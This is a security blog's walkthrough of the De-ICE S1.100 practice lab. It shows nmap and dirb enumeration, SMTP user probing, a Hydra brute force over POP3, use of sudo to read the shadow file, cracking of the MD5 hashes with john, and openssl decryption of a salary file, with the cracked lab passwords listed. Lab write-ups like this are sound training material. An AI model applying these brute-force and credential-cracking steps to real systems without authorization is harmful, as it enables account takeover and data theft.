<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>De-ICE S1.100 walkthrough</title>
  <meta name="description" content="Information Gathering">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/pentesting/2015/11/16/deice-s1100.html">
  <link rel="alternate" type="application/rss+xml" title="Another security blog" href="http://localhost:4000/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Another security blog</a>

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      <div class="trigger">
        
          
        
          
        
          
        
      </div>
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">De-ICE S1.100 walkthrough</h1>
    <p class="post-meta"><time datetime="2015-11-16T12:55:41-08:00" itemprop="datePublished">Nov 16, 2015</time></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <h2 id="information-gathering">Information Gathering</h2>

<h3 id="service-enumeration">Service Enumeration</h3>

<pre>
<code>
root@kali:~# nmap -p21,22,25,80,110,143,443 -sV 192.168.1.100
Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-11-11 01:52 EST
Nmap scan report for 192.168.1.100
Host is up (0.00035s latency).
PORT    STATE  SERVICE VERSION
21/tcp  open   ftp     vsftpd (broken: could not bind listening IPv4 socket)
22/tcp  open   ssh     OpenSSH 4.3 (protocol 1.99)
25/tcp  open   smtp    Sendmail 8.13.7/8.13.7
80/tcp  open   http    Apache httpd 2.0.55 ((Unix) PHP/5.1.2)
110/tcp open   pop3    Openwall popa3d
143/tcp open   imap    UW imapd 2004.357
443/tcp closed https
MAC Address: 08:00:27:54:93:FD (Cadmus Computer Systems)
</code>
</pre>

<p>FTP connection to port TCP 21 gives me the following error:</p>

<pre>
<code>
# ftp 192.168.1.100
Connected to 192.168.1.100.
500 OOPS: could not bind listening IPv4 socket
</code>
</pre>

<h3 id="web-server-enumeration">Web Server Enumeration</h3>

<p>There’s a Webserver listening on TCP 80. This webserver is hosting a page on /index2.php containing employee’s email addresses and names:</p>

<p><img src="/images/screen1.png" alt="Alt text" /></p>

<pre>
Head of HR: Marie Mary - marym@herot.net (On Emergency Leave)
Employee Pay: Pat Patrick - patrickp@herot.net
Travel Comp: Terry Thompson - thompsont@herot.net
Benefits: Ben Benedict - benedictb@herot.net

Director of Engineering: Erin Gennieg - genniege@herot.net
Project Manager: Paul Michael - michaelp@herot.net
Engineer Lead: Ester Long - longe@herot.net

Sr. System Admin: Adam Adams - adamsa@herot.net
System Admin (Intern): Bob Banter - banterb@herot.net
System Admin: Chad Coffee - coffeec@herot.net
</pre>

<p>Using <b>dirb</b>, I was able to enumerate 4 more webpages:</p>

<pre>
+ http://192.168.1.100/~ftp (CODE:403|SIZE:412)
+ http://192.168.1.100/cgi-bin/ (CODE:403|SIZE:297)
+ http://192.168.1.100/index.php (CODE:200|SIZE:1983)
+ http://192.168.1.100/info.php (CODE:200|SIZE:37922)
</pre>

<p>/~ftp and /cgi-bin/ are not accessible. <b>info.php</b> contains the PHP configuration of the website:</p>

<p><img src="/images/screen2.png" alt="Alt text" /></p>

<p>Some interesting information from the info.php:</p>

<ul>
  <li>The kernel is 2.6.16 32bit</li>
  <li>allow_url_fopen is enable, which can be used is there’s a RFI vulnerability present</li>
  <li>Apache is running under nobody’s account, which means I won’t get root access in case of a compromise throught the web server application</li>
</ul>

<p>To generate a possible wordlist to use against password attacks, I use the tool cewl to grab information from the webpage /index2.php and generate a list of possible passwords:</p>

<p><img src="/images/screen3.png" alt="Alt text" /></p>

<p>The SysAdmins are the most probably users of the core system, so I generate a simple list with possible usernames for the OS:</p>

<p>Some companies use the email username section as usernames, but other permutations may happen as well. What I did was also use first letter of first name + surname:</p>

<pre>
aadams
bbanter
ccoffee
</pre>

<p>and the normal email usernames:</p>

<pre>
adamsa
banterb
coffeec
</pre>

<p>I put everything into a file admin_users.txt.</p>

<h3 id="smtp-enumeration">SMTP Enumeration</h3>

<p>Now I can use the SMTP server to enumerate the admin_users.txt list:</p>

<p><img src="/images/screen4.png" alt="Alt text" /></p>

<p>I get 3 usernames found: <b>aadams</b>, <b>bbanter</b>, <b>ccofee</b>. Notice also that I had to use a <b>from email: my@slax.example.net</b> which is the domain the SMTP server accepts.</p>

<h2 id="exploitation">Exploitation</h2>

<h3 id="penetrating-the-system">Penetrating the System</h3>

<p>Per the previous information gathering phase, I was able to learn that there are at least 3 known users in the system: aadams, bbanter, ccofee.</p>

<p>Per the information available in the website, I know that Bob Banter (bbanter) is an intern and probably lacks some good security pratices. This makes him a target.</p>

<p>I was able to login into the system through SSH, using the username bbanter and password bbanter:</p>

<p><img src="/images/screen5.png" alt="Alt text" /></p>

<p>As expected, Bob Banter is not following the good security practices and used his username as the password.</p>

<h3 id="local-privilege-escalation">Local Privilege Escalation</h3>

<p>From the /etc/passwd file I can see the account aadams is part of the wheel group, which means it can sudo with root privileges:</p>

<p><img src="/images/screen6.png" alt="Alt text" /></p>

<p>The account aadams becomes a target as it can provide me high privileges on the machine.</p>

<p>I run a password brute force attack against aadams account with Hydra and I get the nostradamus password:</p>

<p><img src="/images/screen7.png" alt="Alt text" /></p>

<p>I’ve used the pop3 service as it’s much faster than trying the brute force against SSH.</p>

<p>I can now change to account aadams and use sudo to get the shadow file:</p>

<p><img src="/images/screen8.png" alt="Alt text" /></p>

<p><img src="/images/screen9.png" alt="Alt text" /></p>

<p>root hash password: $1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0</p>

<pre>
aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
</pre>

<p>Just using the account aadams and sudo I can see there’s a interesting file in /home/ftp/incoming:</p>

<p><img src="/images/screen10.png" alt="Alt text" /></p>

<p>The file seems to be encrypted.</p>

<p>I proceed and try to crack the password hashes in the shadow with john the ripper:</p>

<pre>
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
</pre>

<p>I was able to crack the hash:</p>

<pre>
root@kali:~# john --show pass.txt 
root:tarot
</pre>

<p>I also found out the ccoffee’s password:</p>
<pre>
ccoffee:hierophant
</pre>

<p>At this moment I have the password for root and the 3 admins:</p>

<pre>
root:tarot
aadams:nostradamus
bbanter:bbanter
ccoffee:hierophant
</pre>

<h3 id="capturing-the-flag">Capturing the Flag</h3>

<p>Analysing the file salary_dec2003.csv.enc with strings, I see the Salted__ word. Some googling tells me this is a openssl encrypted file.</p>

<p>From the /etc/passwd file I got a hint that the root’s password might be used in the FTP encryption (and consequently the .csv file). I scp the file to my Kali machine and use openssl to decrypt the file:</p>

<pre>
root@kali:~# openssl enc -aes-128-cbc -d -in salary_dec2003.csv.enc -out salary_dec2003.csv -k tarot
</pre>

<p>I didn’t know the cipher used for the encryption, so I tried the first one and I was lucky. Now I open the .csv file in Excel:</p>

<p><img src="/images/screen11.png" alt="Alt text" /></p>

  </div>

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <!-- <h2 class="footer-heading">Another security blog</h2> -->

    <div class="footer-col-wrapper">
	<!--
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li>Another security blog</li>
          <li><a href="mailto:"></a></li>
        </ul>
      </div>
	-->

      <div class="footer-col footer-col-2">
        <ul class="social-media-list">
          

          
        </ul>
      </div>

      <div class="footer-col footer-col-3">
        <p>My adventures in the Infosec world.
</p>
      </div>
    </div>

  </div>

</footer>


  </body>

</html>
